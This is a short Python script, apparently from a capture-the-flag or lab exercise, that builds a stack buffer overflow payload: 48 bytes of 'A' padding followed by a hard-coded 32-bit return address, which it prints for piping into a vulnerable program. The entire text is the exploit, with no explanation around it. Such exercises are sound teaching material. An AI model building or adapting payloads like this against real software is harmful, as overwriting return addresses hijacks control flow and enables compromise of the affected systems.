offset = 48

before_buff = b'A'*offset

to_addr = b'\xf8\x84\x04\x08'

payload = before_buff + to_addr
print(payload.decode())
